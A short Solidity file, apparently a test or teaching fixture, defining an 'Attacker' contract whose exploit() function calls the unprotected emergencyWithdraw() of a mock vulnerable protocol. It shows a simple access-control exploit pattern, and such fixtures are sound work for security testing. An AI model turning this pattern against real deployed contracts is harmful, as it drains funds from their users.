// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {MockVulnerableProtocol} from "./MockVulnerableProtocol.sol";

/// @notice Exploite MockVulnerableProtocol via la fonction non protégée.
contract Attacker {
    MockVulnerableProtocol public immutable target;

    constructor(MockVulnerableProtocol target_) {
        target = target_;
    }

    function exploit() external {
        target.emergencyWithdraw();
    }
}
